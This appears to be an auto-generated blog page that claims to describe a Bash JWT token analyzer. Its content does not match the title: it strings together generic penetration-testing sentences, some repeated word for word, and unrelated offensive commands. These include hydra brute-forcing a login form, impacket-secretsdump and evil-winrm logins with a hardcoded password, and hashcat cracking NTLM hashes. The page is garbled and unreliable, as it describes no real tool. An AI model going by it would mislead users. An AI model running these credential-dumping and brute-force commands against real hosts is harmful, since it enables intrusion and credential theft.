---
TitleSEO: "JWT Token Analyzer in Bash | ZureFX"
TitlePost: "JWT Token Analyzer — Bash"
Author: "ZureFX"
Description: "A Bash script for jwt token analyzer. Built for security research and automation."
Keywords: "tool, bash, c, script, scanner"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-461.html"
URL_IMAGES: ""
Date: "2025-07-24"
Tags: "Tool, Bash, C, Script, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-461"
Permalink: "/scripting/script-jwt-token-analyzer-461.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `rubeus`
- `nmap`
- `mimikatz`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.119.33.15/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.3.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.98.112
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p443,53,389 10.50.249.174 -oN scan.txt
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.19.10.64 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```bash
feroxbuster -h
evil-winrm -i 10.61.105.32 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.41.44.106 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 15.51s
```
